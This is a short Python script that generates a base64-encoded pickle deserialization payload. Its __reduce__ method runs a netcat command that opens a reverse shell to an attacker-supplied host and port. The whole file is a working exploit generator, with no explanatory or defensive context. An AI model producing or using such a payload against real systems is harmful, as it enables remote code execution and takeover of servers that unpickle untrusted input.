import pickle, base64,os
lhost=input("LHOST: ")
lport=input("LPORT: ")
class PAYLOAD(object):
  def __reduce__(self):
    return (os.system,(f"nc -nv {lhost} {lport} -e /bin/sh",))
deserialpayload = PAYLOAD()
serialpayload = pickle.dumps(deserialpayload)
payload = base64.b64encode(serialpayload)
print(payload)
